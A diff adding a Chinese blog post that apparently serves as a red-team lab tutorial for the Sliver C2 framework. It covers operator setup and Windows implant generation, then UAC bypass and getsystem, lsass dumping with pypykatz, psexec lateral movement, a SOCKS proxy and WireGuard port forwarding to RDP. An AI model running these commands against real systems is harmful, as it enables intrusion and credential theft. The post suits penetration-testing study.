@@ -1,0 +1,556 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=dark>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="0ldcat">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="创建协作在server端一切正常的情况下，使用server端创建一位新的操作员，然后再使用客户端以此操作员的凭证连接到服务端 客户端下载地址：https:&#x2F;&#x2F;github.com&#x2F;BishopFox&#x2F;sliver&#x2F;releases&#x2F;tag&#x2F;v1.5.42 1sliver-server operator --name test1 --lhost 192.168.80.128 --save st  使">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SliverC2 教程(2)">
+<meta property="og:url" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/index.html">
+<meta property="og:site_name" content="0ldcat_blog">
+<meta property="og:description" content="创建协作在server端一切正常的情况下，使用server端创建一位新的操作员，然后再使用客户端以此操作员的凭证连接到服务端 客户端下载地址：https:&#x2F;&#x2F;github.com&#x2F;BishopFox&#x2F;sliver&#x2F;releases&#x2F;tag&#x2F;v1.5.42 1sliver-server operator --name test1 --lhost 192.168.80.128 --save st  使">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102162654445.png">
+<meta property="og:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102163156788.png">
+<meta property="og:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102164447407.png">
+<meta property="og:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102164535332.png">
+<meta property="og:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102164759495.png">
+<meta property="og:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102164829242.png">
+<meta property="og:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102164952258.png">
+<meta property="og:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102165029546.png">
+<meta property="og:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102165045829.png">
+<meta property="og:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102165111899.png">
+<meta property="og:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102165144708.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-a01c5c3fc7c2113bbd31fcf13e54faef0a97edcd.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-98c3a30b160937525c538a0242bd162c2b4124d8.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-6c8fa57c67fc193974d74c2e18d3536052e8ad2b.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-3fe0027b43c6bebe4b3883b52c597daafd0bc66c.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-dcf1218ed607d02be398a8fddf9bd7f0d08013cc.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-a71bf5836a47e4e4261bf6808d11980684c7d54c.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-c90aa6d9042d36984d75966ff1b782f14c887252.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-0efa4b68e18a74ee591b51e34a120c857553af24.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-bc6ec4ba79252a359b0388ab5629f0cb4164d3f6.png">
+<meta property="og:image" content="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-12ec25f3b399e5655da32c34a8b5b142dee96ce0.png">
+<meta property="og:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102170348590.png">
+<meta property="og:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102170405140.png">
+<meta property="og:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102170552840.png">
+<meta property="og:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102170813214.png">
+<meta property="og:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102170858593.png">
+<meta property="og:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102171200975.png">
+<meta property="article:published_time" content="2024-11-02T05:05:39.000Z">
+<meta property="article:modified_time" content="2024-11-04T12:36:16.152Z">
+<meta property="article:author" content="0ldcat">
+<meta property="article:tag" content="C2">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102162654445.png">
+  
+  
+  <title>SliverC2 教程(2) - 0ldcat_blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.13","typing":{"enable":true,"typeSpeed":70,"cursorChar":"😒","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>闲言碎语</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="SliverC2 教程(2)">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2024-11-02 13:05" pubdate>
+        2024年11月2日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6.3k 个字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      53 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SliverC2 教程(2)</h1>
+            
+            <div class="markdown-body">
+              <h1 id="创建协作"><a href="#创建协作" class="headerlink" title="创建协作"></a>创建协作</h1><p>在server端一切正常的情况下，使用server端创建一位新的操作员，然后再使用客户端以此操作员的凭证连接到服务端</p>
+<p>客户端下载地址：<a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver/releases/tag/v1.5.42">https://github.com/BishopFox/sliver/releases/tag/v1.5.42</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">sliver-server operator --name test1 --lhost 192.168.80.128 --save st<br></code></pre></div></td></tr></table></figure>
+
+<p>使用 <strong>operator</strong> 参数创建 名为 test1 地址为 192.168.80.128 配置文件存放至 st 中</p>
+<p>还有一种创建方式是进入到sliver-server中，然后 new-operator –name pentest –lhost 192.168.<em>.</em></p>
+<p>这个包含了身份验证的证书，客户端验证的私钥和证书，以及令牌</p>
+<p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102162654445.png" srcset="/img/loading.gif" lazyload alt="image-20241102162654445"></p>
+<p>然后使用client带入配置文件就行</p>
+<p>.&#x2F;sliver-client_linux import ..&#x2F;st&#x2F;test1_192.168.80.128.cfg</p>
+<p>然后打开即可</p>
+<p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102163156788.png" srcset="/img/loading.gif" lazyload alt="image-20241102163156788"></p>
+<h2 id="Sliver-C2-协议概述"><a href="#Sliver-C2-协议概述" class="headerlink" title="Sliver C2 协议概述"></a>Sliver C2 协议概述</h2><figure class="highlight clean"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs clean">## <span class="hljs-number">1.</span> mutual TLS (mTLS) <br><br>## <span class="hljs-number">2.</span> WireGuard <br><br>## <span class="hljs-number">3.</span> HTTP(S) <br><br>## <span class="hljs-number">4.</span> DNS<br></code></pre></div></td></tr></table></figure>
+
+<p><strong>前两种协议都是官⽅⾮常推荐的</strong>，后两种则是在更为常⻅的场景中使⽤，在⼀些严格限制的环境中，如只允许 HTTP(S) 和 DNS 出⽹，那么就需要⽤到后两种协议。下面使用 mtls 创建 <a target="_blank" rel="noopener" href="https://www.cloudflare.com/zh-cn/learning/access-management/what-is-mutual-tls/">https://www.cloudflare.com/zh-cn/learning/access-management/what-is-mutual-tls/</a></p>
+<h1 id="生成二进制木马"><a href="#生成二进制木马" class="headerlink" title="生成二进制木马"></a>生成二进制木马</h1><p>​	Session模式和Beacon模式。Session模式是持久连接；</p>
+<p>​	Beacon是异步通信⽅式，即执 ⾏累计的任务，定时（60s）回连，这与CobaltStrike的回连模式⼀致。</p>
+<h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>使用 generate 参数在server中生成木马，使用 help generate 查看参数帮助，以下是常用参数</p>
+<ul>
+<li><code>--mtls 192.168.122.111</code> ：木马相互验证的 TLS 连接连接到 Sliver 服务器。其他选项包括<a target="_blank" rel="noopener" href="https://cshihong.github.io/2020/10/11/WireGuard%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/">–wg （基于 WireGuard</a>）<code>--http</code> （用于 HTTP(S) 连接）或<code>--dns</code> （用于基于 DNS 的 C2）。</li>
+<li><code>--os windows</code> ：指定我们要在 Windows 上运行植入程序（这是默认设置，因此我们可以忽略这一点）。还支持 MacOS 和 Linux。</li>
+<li><code>--arch amd64</code> “ 指定我们需要 64 位植入（也是默认值，可以省略）。使用<code>--arch 386</code>进行 32 位植入。</li>
+<li><code>--format exe</code> ：指定我们想要一个可执行文件（同样是默认值）。其他选项包括用于动态库的<code>--format shared</code> 、用于 Windows 服务二进制文件的<code>--format service</code> （可与<code>psexec</code>命令一起使用）和<code>shellcode</code> （仅限 Windows）。</li>
+<li><code>--save /var/www/html/</code> ：指定保存输出文件的目录。</li>
+</ul>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">generate <span class="hljs-params">--mtls</span> 192.168.80.128 <span class="hljs-params">--os</span> Windows <span class="hljs-params">--arch</span> amd64 <span class="hljs-params">--format</span> exe <span class="hljs-params">--save</span> <span class="hljs-string">./</span><br>使用此命令生成<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102164447407.png" srcset="/img/loading.gif" lazyload alt="image-20241102164447407"></p>
+<p>然后创建一个监听器，将木马放到测试机中，查看上线情况</p>
+<p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102164535332.png" srcset="/img/loading.gif" lazyload alt="image-20241102164535332"></p>
+<p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102164759495.png" srcset="/img/loading.gif" lazyload alt="image-20241102164759495"></p>
+<p>运行完毕之后，在server可以看到上线通知，可以运行sessions查看会话列表，使用use接管会话</p>
+<p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102164829242.png" srcset="/img/loading.gif" lazyload alt="image-20241102164829242"></p>
+<p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102164952258.png" srcset="/img/loading.gif" lazyload alt="image-20241102164952258"></p>
+<p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102165029546.png" srcset="/img/loading.gif" lazyload alt="image-20241102165029546"></p>
+<p>可以看到很多命令可以执行<img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102165045829.png" srcset="/img/loading.gif" lazyload alt="image-20241102165045829"></p>
+<p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102165111899.png" srcset="/img/loading.gif" lazyload alt="image-20241102165111899"></p>
+<p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102165144708.png" srcset="/img/loading.gif" lazyload alt="image-20241102165144708"></p>
+<p>background参数可以让会话后台活跃，session -k <ID>  终止会话</ID></p>
+<h3 id="Privilege-Escalation-权限提升"><a href="#Privilege-Escalation-权限提升" class="headerlink" title="Privilege Escalation | 权限提升"></a>Privilege Escalation | 权限提升</h3><p>绕过 UAC 及获取 SYSTEM 权限</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">上传文件并执行，绕过uac提权 [这里似乎失败了]</span><br>upload /root/Desktop/uac.ps1 &quot;C:\Users\Administrator\Desktop\uac.ps1&quot;<br>execute -o powershell -ExecutionPolicy Bypass -File &quot;C:\Users\Administrator\Desktop\uac.ps1&quot;<br>getsystem<br></code></pre></div></td></tr></table></figure>
+
+<h3 id="Persistence-持久化"><a href="#Persistence-持久化" class="headerlink" title="Persistence | 持久化"></a>Persistence | 持久化</h3><p>进程迁移</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">查看进程列表信息</span><br>ps<br><span class="hljs-meta prompt_"># </span><span class="language-bash">进程迁移</span><br>migrate 3108<br><span class="hljs-meta prompt_"># </span><span class="language-bash">切换进程</span><br>use 244e1361<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-a01c5c3fc7c2113bbd31fcf13e54faef0a97edcd.png" srcset="/img/loading.gif" lazyload alt="p9PUTII.png"></p>
+<h3 id="Credential-Access-凭据访问"><a href="#Credential-Access-凭据访问" class="headerlink" title="Credential Access | 凭据访问"></a>Credential Access | 凭据访问</h3><p>导出 lsass.dump 信息，离线破解，需要 SYSTEM 权限。</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">导出lsass信息 [需要system权限]</span><br>procdump --pid 664 --save lsass.dump<br><span class="hljs-meta prompt_">kali&gt; </span><span class="language-bash">pypykatz lsa minidump lsass.dump</span><br></code></pre></div></td></tr></table></figure>
+
+<h3 id="Discovery-深入探索"><a href="#Discovery-深入探索" class="headerlink" title="Discovery | 深入探索"></a>Discovery | 深入探索</h3><p>获取网络邻居缓存条目</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">原生命令</span><br>Get-NetNeighbor | Where-Object -Property State -NE &quot;Unreachable&quot; | Select-Object -Property IPAddress<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Sliver中执行</span><br>execute -o powershell &quot;Get-NetNeighbor | Where-Object -Property State -NE &quot;Unreachable&quot; | Select-Object -Property IPAddress&quot;<br></code></pre></div></td></tr></table></figure>
+
+<p>Powershell 中进行 ping 扫描探测存活</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">1</span><br>99..102 | foreach &#123; &#x27;10.10.1.$&#123;_&#125;: $(Test-Connection -TimeToLive 64 -Count 1 -ComputerName 10.10.1.$&#123;_&#125; -Quiet)&#x27; &#125;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">2</span><br>99..102 | foreach &#123;(New-Object System.Net.NetworkInformation.Ping).Send(&quot;10.10.1.$&#123;_&#125;&quot;, 1000)&#125;<br></code></pre></div></td></tr></table></figure>
+
+<h3 id="Lateral-Movement-横向移动"><a href="#Lateral-Movement-横向移动" class="headerlink" title="Lateral Movement | 横向移动"></a>Lateral Movement | 横向移动</h3><p>这里以 psexec 横向移动为例，进行演示。</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">创建配置文件</span><br>profiles new --format service --skip-symbols --mtls 172.16.181.182 psexec_test<br><span class="hljs-meta prompt_"># </span><span class="language-bash">执行psexec攻击</span><br>psexec -profile pentest --service-name pentest -service-description pentest red.team<br></code></pre></div></td></tr></table></figure>
+
+<p>本地环境，有些配置没有开启<br><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-98c3a30b160937525c538a0242bd162c2b4124d8.png" srcset="/img/loading.gif" lazyload alt="p9PUp8K.png"></p>
+<h3 id="Command-Control-内网穿透"><a href="#Command-Control-内网穿透" class="headerlink" title="Command&amp;Control | 内网穿透"></a>Command&amp;Control | 内网穿透</h3><h4 id="Socks-Proxy-内网代理"><a href="#Socks-Proxy-内网代理" class="headerlink" title="Socks Proxy | 内网代理"></a>Socks Proxy | 内网代理</h4><p>Sliver C2 中搭载了内置的 Socks5 命令，用于快速创建 Socks 代理</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">socks5 start -P 9001<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-6c8fa57c67fc193974d74c2e18d3536052e8ad2b.png" srcset="/img/loading.gif" lazyload alt="p9PU9gO.png"></p>
+<blockquote>
+<p>这里是在客户端中执行的，有个疑问就是为什么可以在客户端上开启 socks 而不是在服务器，稍微复杂。</p>
+</blockquote>
+<p>在浏览器中设置代理<br><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-3fe0027b43c6bebe4b3883b52c597daafd0bc66c.png" srcset="/img/loading.gif" lazyload alt="p9PUIZd.png"></p>
+<p>在内网机器上开启简易http服务来测试<br><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-dcf1218ed607d02be398a8fddf9bd7f0d08013cc.png" srcset="/img/loading.gif" lazyload alt="p9PUodA.png"></p>
+<h4 id="Wireguard-端口转发"><a href="#Wireguard-端口转发" class="headerlink" title="Wireguard | 端口转发?"></a>Wireguard | 端口转发?</h4><blockquote>
+<p>参考 - <a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver/wiki/Port-Forwarding">Port Forwarding(github.com)</a></p>
+</blockquote>
+<p>端口转发为例：<br>创建监听器，生成Implant</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">开启WireGuard监听器</span><br>wg --lport 9100<br><span class="hljs-meta prompt_"># </span><span class="language-bash">生成对应的Implant</span><br>generate --wg 172.16.181.182:9100 --os windows --arch amd64 --format exe<br></code></pre></div></td></tr></table></figure>
+
+<p>执行上线，对端的地址就配置为了100.64段<br><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-a71bf5836a47e4e4261bf6808d11980684c7d54c.png" srcset="/img/loading.gif" lazyload alt="p9PUzZj.png"></p>
+<p>添加端口转发，转发目标主机3389端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">wg-portfwd add -r 172.16.181.139:3389<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-c90aa6d9042d36984d75966ff1b782f14c887252.png" srcset="/img/loading.gif" lazyload alt="p9PUXQS.png"></p>
+<p>导出 wireguard 配置文件，在其中的 Endpoint 字段设置为 Sliver 服务端的WireGuard监听器。</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">wg-config -s /usr/local/etc/wireguard/wireguard.conf<br><br>Address = 100.64.0.8/16<br>ListenPort = 51902<br>PrivateKey = uG6A0qrE95iboIM33RdkzXrKX1a99M3PcCHHm+hAyGg=<br>MTU = 1420<br>[Peer]<br>PublicKey = 4FcKBOGCHP2jvnDHZyo8Ga/iulFf0SvRzjOP85/k+DM=<br>AllowedIPs = 100.64.0.0/16<br>Endpoint = 172.16.181.182:9100<br></code></pre></div></td></tr></table></figure>
+
+<p>安装 WireGuard 工具，建立通信</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">MacOS</span><br>brew install wireguard-tools<br><span class="hljs-meta prompt_"># </span><span class="language-bash">Linux</span><br>apt install wireguard-tools<br></code></pre></div></td></tr></table></figure>
+
+<p>启动 WireGuard 工具</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">wg-quick up wireguard<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-0efa4b68e18a74ee591b51e34a120c857553af24.png" srcset="/img/loading.gif" lazyload alt="p9PUjsg.png"><br>开启后就可以远程连接了<br>参考：<a target="_blank" rel="noopener" href="https://github.com/miniactive/wall/blob/master/2.%E5%9C%A8mac%E4%B8%8A%E4%BD%BF%E7%94%A8wireguard-tools%E6%9D%A5%E5%9F%BA%E4%BA%8Ewireguard%E8%BF%9B%E8%A1%8C%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91.md#%E5%9C%A8mac%E4%B8%8B%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8">wall&#x2F;在mac上使用wireguard-tools (github.com)</a></p>
+<h2 id="3-4-安全配置"><a href="#3-4-安全配置" class="headerlink" title="3.4 安全配置"></a>3.4 安全配置</h2><h3 id="端口修改"><a href="#端口修改" class="headerlink" title="端口修改"></a>端口修改</h3><p>修改服务端配置文件，修改为非常见常见端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">vi ~/.sliver/configs/server.json<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-bc6ec4ba79252a359b0388ab5629f0cb4164d3f6.png" srcset="/img/loading.gif" lazyload alt="p9PUvLQ.png"><br>如果生成了多操作员的配置文件，在其中修改端口选项</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">vi ~/.sliver-client/configs/x1gua_172.16.181.1.cfg<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2023/04/attach-12ec25f3b399e5655da32c34a8b5b142dee96ce0.png" srcset="/img/loading.gif" lazyload alt="p9PaSds.png"></p>
+<p>基本信息</p>
